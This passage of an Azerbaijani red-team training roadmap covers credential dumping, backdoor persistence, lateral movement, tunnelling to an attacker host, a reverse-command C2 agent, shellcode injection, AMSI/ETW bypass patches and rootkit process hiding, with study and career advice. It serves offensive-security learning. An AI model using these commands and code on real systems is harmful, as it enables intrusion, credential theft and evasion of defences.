1. MITRE ATT&CK: Credential Access techniques
2. "Windows Red Team Tradecraft" - HackTricks
3. "The Art of Memory Forensics"

**Tools:**
- Mimikatz, LaZagne, SharpChrome
- Rubeus, Certify
- Covenant, Sliver, Havoc

### **Öyrənmə Sırası:**

**GÜN 1-6: Credential Dumping**
```
SƏHƏR (2 saat):
├─ LSASS process:
   - lsass.exe (Local Security Authority Subsystem Service)
   - Credentials in memory (plaintext, hashes, tickets)

├─ SAM database:
   - C:\Windows\System32\config\SAM
   - Local account hashes

├─ LSA Secrets:
   - Service account passwords
   - Auto-logon credentials

├─ DPAPI:
   - Chrome/Firefox saved passwords
   - RDP credentials

AXŞAM (4 saat):
├─ LAB (Windows 10 + Server):

# LSASS dump:
# Method 1: Mimikatz
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
mimikatz # sekurlsa::tickets

# Method 2: Task Manager (GUI)
# Right-click lsass.exe → Create dump file

# Method 3: ProcDump (Sysinternals)
procdump.exe -accepteula -ma lsass.exe lsass.dmp

# Method 4: comsvcs.dll (native)
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump [lsass_pid] C:\temp\lsass.dmp full

# Offline parse:
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords

# SAM dump:
reg save HKLM\SAM sam.hive
reg save HKLM\SYSTEM system.hive
impacket-secretsdump -sam sam.hive -system system.hive LOCAL

# DPAPI:
mimikatz # sekurlsa::dpapi
# SharpChrome (Chrome passwords):
SharpChrome.exe logins

TAPŞIRIQ:
├─ 10+ credential dump method test edin
├─ LSASS protection bypass (RunAsPPL)
├─ Offline LSASS dump analysis
├─ Browser credential extraction
├─ Kerberos ticket extraction
└─ LaZagne tool (all credentials)
```

**GÜN 7-12: Persistence Techniques**
```
SƏHƏR (2 saat):
├─ Registry Run keys:
   - HKCU\Software\Microsoft\Windows\CurrentVersion\Run
   - HKLM\Software\Microsoft\Windows\CurrentVersion\Run

├─ Scheduled Tasks:
   - schtasks.exe
   - XML task definition

├─ Services:
   - sc.exe create
   - Service DLL hijacking

├─ WMI Event Subscriptions:
   - Fileless persistence

├─ Startup folder:
   - C:\Users\[user]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup

AXŞAM (4 saat):
├─ PERSISTENCE LAB:

# Registry:
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" 
/v Backdoor /t REG_SZ /d "C:\backdoor.exe"

# Scheduled Task:
schtasks /create /tn "WindowsUpdate" /tr "C:\backdoor.exe" 
/sc onlogon /ru SYSTEM

# Service:
sc create BackdoorSvc binPath= "C:\backdoor.exe" start= auto
sc start BackdoorSvc

# WMI Event:
# PowerShell:
$Filter = Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" 
-Arguments @{Name="Evil"; EventNameSpace="root\cimv2"; 
QueryLanguage="WQL"; Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 
WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"}

$Consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" 
-Arguments @{Name="Evil"; CommandLineTemplate="C:\backdoor.exe"}

$Binding = Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" 
-Arguments @{Filter=$Filter; Consumer=$Consumer}

# Golden Ticket persistence:
# Create TGT valid for 10 years

TAPŞIRIQ:
├─ 15+ persistence technique test edin
├─ Reboot sonra access qalır yoxla
├─ Detection: Windows Event logs
├─ Stealth persistence (WMI, registry timestamp)
└─ Cleanup: Bütün persistence remove edin

NƏTICƏ CHECK:
☐ LSASS dump (5+ method)
☐ SAM, LSA secrets extraction
☐ Browser credentials dump
☐ 15+ persistence technique
☐ Reboot-resistant backdoor
```

---

## HƏFTƏ 25-26: LATERAL MOVEMENT & PIVOTING

### **Materiallar:**
- "The Hacker Playbook 3" (Chapter 4)
- MITRE ATT&CK: Lateral Movement
- Impacket suite documentation

### **Öyrənmə Sırası:**

**GÜN 1-6: Lateral Movement**
```
SƏHƏR (2 saat):
├─ Lateral Movement methods:
   - PsExec (SMB + Service)
   - WMI (Windows Management Instrumentation)
   - DCOM (Distributed COM)
   - RDP (Remote Desktop)
   - WinRM (Windows Remote Management)
   - SSH (Windows 10+)

AXŞAM (4 saat):
├─ LAB (3 machines: Attacker, Target1, Target2):

# PsExec:
# Impacket:
psexec.py LAB/admin@192.168.1.20

# CrackMapExec:
crackmapexec smb 192.168.1.0/24 -u admin -p password -x "whoami"

# WMI:
wmic /node:192.168.1.20 /user:admin /password:pass process call create "cmd.exe"

# Impacket:
wmiexec.py LAB/admin@192.168.1.20

# DCOM (MMC20.Application):
$com = [Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","192.168.1.20"))
$com.Document.ActiveView.ExecuteShellCommand("cmd.exe",$null,"/c calc.exe","")

# RDP:
xfreerdp /u:admin /p:password /v:192.168.1.20

# WinRM:
evil-winrm -i 192.168.1.20 -u admin -p password

# Pass-the-Hash:
crackmapexec smb 192.168.1.20 -u admin -H ntlm_hash -x "whoami"

TAPŞIRIQ:
├─ Hər method-u test edin (6+)
├─ Pass-the-Hash lateral movement
├─ Overpass-the-Hash (Rubeus)
├─ Token impersonation (incognito)
└─ Detection: Event logs (4624, 4688, 4672)
```

**GÜN 7-12: Pivoting & Tunneling**
```
SƏHƏR (2 saat):
├─ Network pivoting concepts
├─ Port forwarding (local, remote, dynamic)
├─ SOCKS proxy
├─ Tunneling protocols (SSH, HTTP, DNS, ICMP)

AXŞAM (4 saat):
├─ LAB SETUP:
   Internet ←→ [Kali] ←→ [Pivot] ←→ [Internal Network]
                        (Dual-NIC)

# SSH Tunneling:
# Local port forward:
ssh -L 8080:internal_server:80 user@pivot_server

# Remote port forward:
ssh -R 8080:localhost:80 user@pivot_server

# Dynamic port forward (SOCKS):
ssh -D 9050 user@pivot_server
# Use with proxychains:
proxychains nmap -sT internal_server

# Chisel (HTTP tunnel):
# Server (attacker):
./chisel server -p 8000 --reverse
# Client (pivot):
./chisel client attacker_ip:8000 R:socks

# ligolo-ng (modern):
# Proxy (attacker):
./proxy -selfcert
# Agent (pivot):
./agent -connect attacker_ip:11601 -ignore-cert

# Metasploit autoroute:
meterpreter > run autoroute -s 10.10.10.0/24
meterpreter > background
msf > use auxiliary/server/socks_proxy

TAPŞIRIQ:
├─ SSH tunneling (3 types)
├─ Chisel SOCKS proxy
├─ ligolo-ng pivoting
├─ Multi-hop pivoting (3+ networks)
├─ DNS tunneling (dnscat2, iodine)
└─ ICMP tunneling (ptunnel)

NƏTICƏ CHECK:
☐ 6+ lateral movement method
☐ Pass-the-Hash istifadə
☐ SSH tunneling (local/remote/dynamic)
☐ Chisel, ligolo-ng pivoting
☐ Multi-hop network access
```

---

## HƏFTƏ 27-28: C2 FRAMEWORKS

### **Materiallar:**
- Sliver documentation (sliver.sh)
- Havoc framework (github.com/HavocFramework/Havoc)
- Covenant documentation

### **Öyrənmə Sırası:**

**GÜN 1-7: Sliver C2**
```
SƏHƏR (2 saat):
├─ C2 architecture:
   - Server (team server)
   - Implant/Agent (beacon)
   - Communication protocol (HTTP, HTTPS, DNS, mTLS)

├─ Sliver features:
   - Cross-platform (Windows, Linux, macOS)
   - Multiple protocols
   - Evasion techniques
   - Post-exploitation modules

AXŞAM (4 saat):
├─ SLIVER SETUP:

# Install:
curl https://sliver.sh/install|sudo bash

# Start server:
sliver-server

# Generate implant:
generate --http attacker_ip --save /tmp/agent.exe

# Listener:
http

# On target: execute agent.exe

# Post-exploitation:
info
shell
execute-assembly SharpHound.exe
upload /local/file C:\remote\path
download C:\remote\file /local/path
screenshot
sideload beacon.dll
pivot (SMB, TCP)

TAPŞIRIQ:
├─ Sliver implant generate (HTTP, HTTPS, DNS)
├─ Evasion: obfuscation, sleep techniques
├─ Pivoting: SMB beacons
├─ Post-exploitation modules test
├─ Malleable C2 profile (custom)
└─ Multi-listener infrastructure
```

**GÜN 8-14: Custom C2 Development**
```
SƏHƏR (3 saat):
├─ C2 components:
   - Server (listener)
   - Agent (implant)
   - Communication channel
   - Command & Control logic
   - Encryption

AXŞAM (5 saat):
├─ BUILD SIMPLE C2 (Python):

# Server (server.py):
import socket, threading, base64
from Crypto.Cipher import AES

clients = []

def handle_client(conn, addr):
    print(f"[+] {addr} connected")
    while True:
        try:
            cmd = input(f"{addr}> ")
            conn.send(encrypt(cmd))
            output = decrypt(conn.recv(4096))
            print(output)
        except:
            break

def encrypt(data):
    # AES encryption
    pass

server = socket.socket()
server.bind(("0.0.0.0", 443))
server.listen(5)
while True:
    conn, addr = server.accept()
    threading.Thread(target=handle_client, args=(conn,addr)).start()

# Agent (agent.py):
import socket, subprocess, os
from Crypto.Cipher import AES

def execute(cmd):
    return subprocess.getoutput(cmd)

def connect():
    s = socket.socket()
    s.connect(("attacker_ip", 443))
    while True:
        cmd = decrypt(s.recv(1024))
        output = execute(cmd)
        s.send(encrypt(output))

# FEATURES TO ADD:
├─ Encryption (AES-256)
├─ Authentication (pre-shared key)
├─ Persistence module
├─ Screenshot
├─ File upload/download
├─ Process injection
├─ Sleep jitter (random delays)
└─ Domain fronting (HTTP)

TAPŞIRIQ:
├─ Simple C2 build edin (Python/C)
├─ Encryption implement edin
├─ Multi-client support
├─ Post-exploitation commands (10+)
├─ Evasion: polymorphic payloads
└─ GitHub-da paylaşın

NƏTICƏ CHECK (FAZA 3 BİTDİ):
☐ Credential dumping (LSASS, SAM, DPAPI)
☐ 15+ persistence techniques
☐ Lateral movement (6+ methods)
☐ Pivoting & tunneling expert
☐ Sliver C2 istifadə edirəm
☐ Custom C2 yazmışam (GitHub-da)
☐ HTB machines: 20+ (post-exploit focus)
```

---

# 💣 FAZA 4: ADVANCED EXPLOITATION (HƏFTƏ 29-36)

## HƏFTƏ 29-32: MALWARE DEVELOPMENT

### **Materiallar:**

**Kurslar:**
1. **Sektor7 Institute (maldev.academy):**
   - Red Team Operator: Malware Development Essentials
   - RTO: Malware Development Intermediate
   - RTO: Malware Development Advanced

**Kitablar:**
2. "Windows Internals" - Mark Russinovich (Part 1)
3. "Practical Malware Analysis" - Michael Sikorski

**Resources:**
4. MITRE ATT&CK: Defense Evasion techniques
5. VX Underground (malware samples research)

### **Öyrənmə Sırası:**

**GÜN 1-7: PE File Structure**
```
SƏHƏR (3 saat):
├─ PE format:
   - DOS header (MZ)
   - PE header (PE\0\0)
   - Optional header
   - Section headers (.text, .data, .rdata, .rsrc)
   - Import Address Table (IAT)
   - Export Address Table (EAT)

├─ PE parsing tools:
   - PE-bear, CFF Explorer
   - pefile (Python)

AXŞAM (4 saat):
├─ CODE (C):

# Simple PE parser:
#include <windows.h>
#include <stdio.h>

void ParsePE(char* filename) {
    HANDLE hFile = CreateFileA(filename, GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
    HANDLE hMap = CreateFileMappingA(hFile, NULL, PAGE_READONLY, 0, 0, NULL);
    LPVOID pFile = MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, 0);
    
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pFile;
    if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        printf("Not a valid PE file\n");
        return;
    }
    
    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((BYTE*)pFile + pDosHeader->e_lfanew);
    printf("Number of sections: %d\n", pNtHeaders->FileHeader.NumberOfSections);
    
    PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pNtHeaders);
    for (int i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++) {
        printf("Section: %s, VirtualAddress: 0x%X\n", 
               pSectionHeader->Name, pSectionHeader->VirtualAddress);
        pSectionHeader++;
    }
}

TAPŞIRIQ:
├─ PE parser yazın (C/Python)
├─ IAT/EAT parsing
├─ Section parsing (.text disassembly)
├─ Malware sample analiz (PE structure)
└─ PE modification (add section, change entrypoint)
```

**GÜN 8-14: Process Injection (Part 1)**
```
SƏHƏR (3 saat):
├─ Injection techniques:
   1. CreateRemoteThread
   2. QueueUserAPC
   3. Thread Hijacking (SetThreadContext)
   4. Process Hollowing
   5. Reflective DLL Injection

AXŞAM (5 saat):
├─ IMPLEMENTATION (C):

// 1. CreateRemoteThread Injection:
#include <windows.h>

int main() {
    // Shellcode (calc.exe):
    unsigned char shellcode[] = 
        "\xfc\x48\x83\xe4\xf0\xe8...";  // msfvenom shellcode
    
    // Open target process:
    DWORD pid = 1234;  // Target PID
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    
    // Allocate memory:
    LPVOID pRemoteCode = VirtualAllocEx(hProcess, NULL, sizeof(shellcode), 
                                         MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    
    // Write shellcode:
    WriteProcessMemory(hProcess, pRemoteCode, shellcode, sizeof(shellcode), NULL);
    
    // Create thread:
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, 
                                         (LPTHREAD_START_ROUTINE)pRemoteCode, 
                                         NULL, 0, NULL);
    
    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    CloseHandle(hProcess);
    return 0;
}

TAPŞIRIQ:
├─ CreateRemoteThread injector yazın
├─ QueueUserAPC injection
├─ Process hollowing (suspend → map → resume)
├─ Thread hijacking
└─ Test: Windows Defender-i bypass edə bilirmi?
```

**GÜN 15-21: Process Injection (Part 2) & Advanced Evasion**
```
SƏHƏR (3 saat):
├─ Advanced injections:
   6. Atom Bombing
   7. Process Doppelgänging
   8. Module Stomping
   9. Phantom DLL Hollowing
   10. Thread Pool Injection

├─ Evasion techniques:
   - API hashing (hide imports)
   - String encryption (XOR, AES)
   - Polymorphic shellcode
   - Sleep obfuscation
   - Syscall direct invocation (unhooking)

AXŞAM (5 saat):
├─ AMSI BYPASS:

// AMSI patch (in-memory):
#include <windows.h>

void BypassAMSI() {
    HMODULE hAmsi = LoadLibraryA("amsi.dll");
    LPVOID pAmsiScanBuffer = GetProcAddress(hAmsi, "AmsiScanBuffer");
    
    // Patch: mov eax, 0x80070057; ret
    unsigned char patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
    
    DWORD oldProtect;
    VirtualProtect(pAmsiScanBuffer, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect);
    memcpy(pAmsiScanBuffer, patch, sizeof(patch));
    VirtualProtect(pAmsiScanBuffer, sizeof(patch), oldProtect, &oldProtect);
}

// ETW patch:
void BypassETW() {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    LPVOID pEtwEventWrite = GetProcAddress(hNtdll, "EtwEventWrite");
    
    // Patch: ret
    unsigned char patch[] = { 0xC3 };
    
    DWORD oldProtect;
    VirtualProtect(pEtwEventWrite, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect);
    memcpy(pEtwEventWrite, patch, sizeof(patch));
    VirtualProtect(pEtwEventWrite, sizeof(patch), oldProtect, &oldProtect);
}

// Syscall direct (unhooking):
// Use SysWhispers to generate syscall stubs

TAPŞIRIQ:
├─ 10 injection technique implement edin
├─ AMSI bypass (3+ method)
├─ ETW patching
├─ Unhooking (syscall direct)
├─ String encryption (AES)
├─ API hashing
└─ Polymorphic engine (simple)
```

**GÜN 22-28: Full Malware Development**
```
FINAL PROJECT: Custom Loader/Dropper

FEATURES:
├─ Multi-stage:
   ├─ Stage 1: Dropper (download stage 2)
   ├─ Stage 2: Loader (decrypt & inject shellcode)
   └─ Stage 3: Beacon (C2 communication)

├─ Evasion:
   ├─ AMSI/ETW bypass
   ├─ Sandbox detection (sleep, mouse movement)
   ├─ Anti-debug (IsDebuggerPresent, PEB check)
   ├─ String encryption
   ├─ API hashing
   └─ Polymorphic (each build different)

├─ Persistence:
   ├─ Registry
   ├─ Scheduled task
   └─ WMI event

├─ Communication:
   ├─ HTTPS C2
   ├─ Domain fronting
   └─ DNS tunneling (fallback)

TEST:
├─ Windows Defender: OFF → ON
├─ Kaspersky/Sophos (VM)
├─ VirusTotal (FINAL test, 1 dəfə!)

NƏTICƏ CHECK:
☐ PE structure tam anlayıram
☐ 10+ process injection method
☐ AMSI/ETW bypass edirəm
☐ Syscall direct invocation
☐ Full malware yazmışam (GitHub)
☐ Windows Defender bypass
```

---

## HƏFTƏ 33-34: KERNEL & ROOTKIT BASICS (OPTIONAL AMA GÜC

LÜ)

*Note: Bu advanced mövzudur, APT-level istəyirsinizsə faydalı*

### **Materiallar:**
- "Rootkits and Bootkits" - Alex Matrosov
- "Windows Kernel Programming" - Pavel Yosifovich
- OSR Online (Windows driver development)

### **Öyrənmə Sırası:**

**GÜN 1-7: Windows Kernel Basics**
```
SƏHƏR (4 saat):
├─ User mode vs Kernel mode
├─ Kernel objects (EPROCESS, ETHREAD)
├─ System calls (ntdll → kernel)
├─ Driver types (WDM, WDF)
├─ IRQL (Interrupt Request Level)

AXŞAM (4 saat):
├─ Setup WDK (Windows Driver Kit)
├─ Simple driver template:

#include <ntddk.h>

VOID DriverUnload(PDRIVER_OBJECT DriverObject) {
    DbgPrint("Driver unloaded\n");
}

NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) {
    DriverObject->DriverUnload = DriverUnload;
    DbgPrint("Driver loaded!\n");
    return STATUS_SUCCESS;
}

├─ Load driver:
   sc create mydriver binPath= C:\driver.sys type= kernel
   sc start mydriver

TAPŞIRIQ:
├─ Simple kernel driver yazın
├─ DbgPrint output DebugView-da baxın
├─ IOCTL communication (user ↔ kernel)
└─ Read/write arbitrary memory (from kernel)
```

**GÜN 8-14: Basic Rootkit Techniques**
```
SƏHƏR (4 saat):
├─ SSDT hooking (System Service Descriptor Table)
├─ DKOM (Direct Kernel Object Manipulation)
├─ Process hiding (unlink EPROCESS)
├─ Callback registration (process, thread, image)

AXŞAM (4 saat):
├─ Process Hiding (DKOM):

// Hide process by PID:
NTSTATUS HideProcess(ULONG pid) {
    PEPROCESS Process;
    PsLookupProcessByProcessId((HANDLE)pid, &Process);
    
    // Unlink from ActiveProcessLinks:
    PLIST_ENTRY pList = (PLIST_ENTRY)((PUCHAR)Process + 0x2e8);  // Offset
    pList->Flink->Blink = pList->Blink;
    pList->Blink->Flink = pList->Flink;
    pList->Flink = pList;
    pList->Blink = pList;
    
    return STATUS_SUCCESS;
}

TAPŞIRIQ:
├─ Process hiding rootkit
├─ File hiding (IRP hooking)
├─ Network traffic hiding
├─ Registry hiding
└─ Detection: Volatility analysis (memory forensics)

CAUTION: Kernel programming BSOD risk! VM-də test edin!
```

---

## HƏFTƏ 35-36: EXPLOITATION REVIEW & CVE HUNTING

**GÜN 1-14: Exploit Development Mastery**
```
DAILY:
├─ pwn.college: Remaining challenges (50+)
├─ Exploit-DB: 5 CVE reproduce edin
├─ 0day research (fuzzing basics):
   ├─ AFL++ (American Fuzzy Lop)
   ├─ libFuzzer
   └─ WinAFL (Windows)

TAPŞIRIQ:
├─ ROP chain (libc-based)
├─ Heap exploitation (fastbin attack)
├─ Format string advanced
├─ Integer overflow exploitation
├─ Kernel use-after-free (basic)
└─ Write 10+ exploit (blog-da share edin)

NƏTICƏ CHECK (FAZA 4 BİTDİ):
☐ PE file tam anlayıram
☐ 10+ injection technique C-də yazıram
☐ AMSI/ETW bypass
☐ Custom malware (AV bypass)
☐ Kernel driver basics
☐ Rootkit techniques
☐ 30+ exploitation challenge
☐ 5+ CVE reproduce etmişəm
```

---

# 🔥 FAZA 5: REAL-WORLD MASTERY (HƏFTƏ 37-52)

## HƏFTƏ 37-44: HTB PRO LABS & ADVANCED MACHINES

```
PRO LABS (8 həftə):

HƏFTƏ 37-38: DANTE
├─ 14 machines
├─ Multiple networks (pivoting)
├─ AD environment
├─ 4-6 saat/gün
└─ HEÇNƏYƏ BAXMADAN!

HƏFTƏ 39-40: OFFSHORE
├─ 19 machines
├─ Advanced AD
├─ Trust relationships
└─ Cross-domain attacks

HƏFTƏ 41-42: CYBERNETICS
├─ APT-simulation
├─ Multi-forest AD
├─ Evasion required
└─ Red Team tactics

HƏFTƏ 43-44: APTLABS (ƏN ÇƏTIN!)
├─ Advanced persistence
├─ Rootkit usage
├─ Full evasion
└─ Custom exploits

DAILY STRUCTURE:
06:00-08:00: Enumeration
08:00-12:00: Exploitation attempts
12:00-13:00: Lunch + mental break
13:00-17:00: Pivoting, post-exploit
17:00-18:00: Notes, methodology review

RULES:
❌ Writeup baxmaq (ilk 48 saat)
❌ Forum hints (ilk 24 saat)
✅ Methodology use edin (öz notes-dan)
✅ Try Harder! (4+ saat ilişsəniz hint)

NƏTICƏ CHECK:
☐ 4 Pro Labs tamam
☐ 60+ machines root/admin
☐ Complex pivoting scenarios
☐ Full AD compromises (5+)
```

---

## HƏFTƏ 45-48: CERTIFICATIONS (SKILL TEST)

**Bu həftələr certification yox, SKILL TEST-dir!**

### **Certification Roadmap:**

**HƏFTƏ 45: CRTP (Certified Red Team Professional)**
```
COST: $249
FOCUS: Active Directory
DURATION: 30 gün lab + exam (24 saat)

EXAM:
├─ 5 machines
├─ AD environment
├─ Kerberoasting, delegation, ACL abuse
└─ Domain Admin compromise

HAZIRLIK:
├─ AD skills review (1 həftə)
├─ Mock lab (home environment)
└─ Altered Security course materials

✅ ALACAQSINIZ (hazırsınız!)
```

**HƏFTƏ 46: CRTO (Certified Red Team Operator)**
```
COST: $500
FOCUS: C2 operations (Cobalt Strike)
DURATION: 4 həftə lab + exam (48 saat)

EXAM:
├─ External → Internal
├─ C2 usage (Cobalt Strike)
├─ Lateral movement
├─ Evasion required
└─ Persistent access

HAZIRLIK:
├─ Cobalt Strike öyrənin (trial version)
├─ C2 tactics review
└─ ZeroPointSecurity course (CRTO)

✅ ALACAQSINIZ!
```

**HƏFTƏ 47-48: OSEP (Offensive Security Experienced Penetration Tester)**
```
COST: $1,649
FOCUS: Advanced techniques
DURATION: 90 gün lab + exam (48 saat + 24 saat report)

EXAM:
├─ 3 separate networks
├─ Advanced pivoting
├─ Lateral movement
├─ AV evasion
├─ Custom exploits
└─ Professional report (24 saat)

HAZIRLIK:
├─ PEN-300 course (Offensive Security)
├─ Practice labs
└─ Report writing practice

⚠️ ÇƏTIN AMA ALACAQSINIZ!
```

**OPTIONAL (Sonra):**
- **CRTE** ($499) - AD Expert
- **OSED** ($1,649) - Exploit Developer
- **OSWE** ($1,649) - Web Expert
- **OSCE3** (OSEP+OSED+OSWE combination)

---

## HƏFTƏ 49-50: PORTFOLIO & BLOG

```
GITHUB PORTFOLIO:

REPOSITORIES:
├─ Red-Team-Tools/
│   ├─ port-scanner/
│   ├─ credential-dumper/
│   ├─ ad-enumeration/
│   ├─ process-injector/
│   └─ custom-c2/
│
├─ Exploit-Development/
│   ├─ buffer-overflow-exploits/
│   ├─ rop-chains/
│   └─ cve-reproductions/
│
├─ Malware-Development/
│   ├─ custom-loader/
│   ├─ injection-techniques/
│   └─ evasion-techniques/
│
└─ HTB-Writeups/
    ├─ dante-lab/
    ├─ offshore-lab/
    └─ machines/ (50+ writeup)

README.md hər repo üçün:
├─ Tool description
├─ Usage examples
├─ Technical details
└─ Disclaimer (legal notice)

BLOG (Medium/Personal):

YAZILACAQ MƏQALƏLƏR (20+):
1. "Linux Privilege Escalation: Complete Guide"
2. "Active Directory Attack Paths Explained"
3. "Kerberoasting: From Theory to Practice"
4. "Process Injection: 10 Techniques"
5. "AMSI Bypass: Multiple Methods"
6. "Building a Custom C2 Framework"
7. "Golden Ticket Attack Deep Dive"
8. "HTB Dante Lab: Full Walkthrough"
9. "Defeating Windows Defender"
10. "Red Team Tradecraft: OPSEC Tips"
... (+ 10 more)

BLOG STRUCTURE:
├─ Introduction
├─ Technical explanation
├─ Lab setup
├─ Step-by-step demo (screenshots)
├─ Code/commands
├─ Detection & defense
└─ References

DAILY (2 həftə):
├─ 1 məqalə/gün yaz (2-3 saat)
├─ Code cleanup (GitHub)
├─ README-lər yaz
└─ LinkedIn posts (networking)
```

---

## HƏFTƏ 51-52: BUG BOUNTY & REAL ENGAGEMENT

**BUG BOUNTY START:**
```
PLATFORMS:
├─ HackerOne
├─ Bugcrowd
├─ Synack (invitation-only)
└─ Intigriti

STRATEGY:
├─ Target selection:
│   ├─ Companies with AD/Windows infrastructure
│   ├─ Programs with "internal infrastructure" scope
│   └─ Private programs (apply)
│
├─ Methodology:
│   ├─ External recon → phishing → internal access
│   ├─ Credential dumps → lateral movement
│   ├─ Privilege escalation → domain admin
│   └─ Write report (professional)
│
└─ Reports:
    ├─ Clear reproduction steps
    ├─ Impact explanation
    ├─ Remediation advice
    └─ Professional tone

FIRST MONTH GOAL:
├─ 5+ valid submissions
├─ 1-2 critical findings
└─ Build reputation (rank up)

PASSIVE INCOME potential: $500-5000/month
```

---

# 🧠 MINDSET & DISCIPLINE FRAMEWORK

## GÜNLÜK RUTİN

```
05:30 - Wake up
05:45 - Exercise (30 min: cardio/gym)
06:30 - Shower + breakfast
07:00 - LEARNING START
       ├─ 07:00-09:00: Nəzəriyyə (kitab, blog, video)
       ├─ 09:00-09:15: Break (çay, meditation)
       ├─ 09:15-12:00: Hands-on lab (focused!)
       └─ 12:00-13:00: Lunch

13:00 - AFTERNOON SESSION
       ├─ 13:00-16:00: Continued lab/challenges
       ├─ 16:00-16:15: Break
       ├─ 16:15-18:00: More practice
       └─ 18:00-18:30: Documentation

18:30 - Dinner + relax
19:30 - EVENING (OPTIONAL):
       ├─ Blog writing (30-60 min)
       ├─ Twitter/community engagement
       ├─ GitHub commits
       └─ Research new CVEs

21:00 - Wind down (no screens)
22:00 - Sleep

TOTAL: 6-8 saat productive work (pure focus)
```

---

## HƏFTƏLIK STRUKTUR

```
BAZ.ERTƏSI - CÜMƏ AXŞAMI (5 gün):
├─ Intensiv öyrənmə
├─ Daily routine (yuxarıda)
└─ Minimum 6 saat/gün

ŞƏNBƏ:
├─ Challenge Day (HTB machine/CTF)
├─ NO TUTORIAL (blind attempt)
├─ 4-6 saat focused hacking
└─ Writeup (əgər həll etsən)

BAZAR:
├─ Recovery + Review
├─ Həftəlik nə öyrəndim? (notes review)
├─ Bloq yazısı yaz (1-2 saat)
├─ Növbəti həftə plan (roadmap check)
├─ Social/hobby time (mental health!)
└─ Early sleep (Bazar ertəsi hazır ol)
```

---

## AYLIK REVIEW

```
HƏR AYIN SONU (29-30):

1. PROGRESS CHECK:
   ☐ Bu ay hansı skills əlavə oldu?
   ☐ Neçə lab/machine həll etdim?
   ☐ Hansı tools yazdım?
   ☐ Bloq yazıları: neçə?
   ☐ GitHub commits: neçə?

2. WEAKNESS ANALYSIS:
   ☐ Hansı mövzuda ilişdim?
   ☐ Niyə ilişdim? (fundamental gap?)
   ☐ Həll: növbəti ay focus area

3. MOTIVATION CHECK:
   ☐ Burnout signs? (Yes → 3 gün tam istirahət)
   ☐ Hələ də istəyirəm? (Yes → davam!)
   ☐ Progress görürəmmi? (Yes → visual tracker update)

4. ADJUST PLAN:
   ☐ Yavaşam? (Speed up, daha çox saat)
   ☐ Burnout? (Slow down, 4 saat/gün)
   ☐ On track? (Continue same pace)
```

---

## MENTAL STRENGTH BUILDING

### **"Try Harder" Mentality:**

```
STUCK olan zaman (hər gün olacaq!):

LEVEL 1: İlk 30 dəqiqə
├─ "Niyə işləmir?" sualını cavablandır
├─ Error message oxu (hər sözü!)
├─ Syntax/logic yoxla
└─ Google: error message + context

LEVEL 2: 30 dəq - 2 saat
├─ Alternative approach-lar test et
├─ Tool documentation oxu (RTFM!)
├─ Wireshark/debugger istifadə et
└─ "Nə baş verir?" - root cause tap

LEVEL 3: 2-4 saat
├─ Break götür (15 dəq walk)
├─ Başqa mövzuya keç (fresh perspective)
├─ Methodology-ni başdan review et
└─ "Nə unutmuşam?" - checklist yoxla

LEVEL 4: 4+ saat
├─ Forum-a bax (HTB: hint, spoiler yox!)
├─ Writeup-a YALNIZ bir hissəyə bax
├─ Həlli gördüyün zaman STOP!
└─ Özün həll et, anlamaq əsas!

IMPORTANT:
✅ 4 saat ilişmək = LEARNING (beyin böyüyür!)
❌ 5 dəqiqə sonra tutorial = ZERO learning!
```

---

## BURNOUT PREVENTION

```
BURNOUT SIGNS (diqqət yetir!):
├─ Motivasiya yoxdur (laptop açmaq istəmirəm)
├─ Konsantrasiya çətindir (5 dəq sonra distraction)
├─ Fiziki əlamətlər (baş ağrısı, göz yorğunluğu)
├─ Sosial izolasiya (hər şeyi təxirə salıram)
└─ "Mənə nədir bundan?" thoughts

IMMEDIATE ACTION:
1. STOP! (1-3 gün tam pause)
2. Exercise (gym, run, outdoor)
3. Social (dostlarla görüş, ailə)
4. Sleep (8+ saat, quality sleep)
5. Hobby (security-dən fərqli!)

PREVENTION:
├─ Hər gün 30 dəq exercise
├─ Həftədə 1 gün TAM istirahət
├─ Ayda 2-3 gün friends/family
├─ 7+ saat yuxu (priority!)
└─ Hobby (musiqi, oxu, travel)

REMEMBER:
"Long-term consistency > short-term intensity"
Burnout olsan, 1 ay itirərsən. Prevention et!
```

---

## COMMUNITY & NETWORKING

```
ONLINE PRESENCE:

TWITTER:
├─ Infosec researchers follow et (100+)
│   @_RastaMouse, @harmj0y, @gentilkiwi, @tifkin_
│   @404death, @exploitph, @0xdf_, @ippsec
├─ Daily tweet: TIL (Today I Learned)
├─ Writeup-ları share et
└─ Engage: comment, retweet (meaningful!)

LINKEDIN:
├─ Profile optimize et (skills, certs)
├─ Post: "I just pwned X machine" (professional!)
├─ Articles share et (blog-dan)
└─ Connect: recruiters, Red Teamers

DISCORD SERVERS:
├─ HackTheBox Official
├─ TryHackMe Community
├─ Red Team Village
├─ Malware Dev & RE
└─ Active ol (help others = solidify knowledge!)

GITHUB:
├─ Daily commits (consistency!)
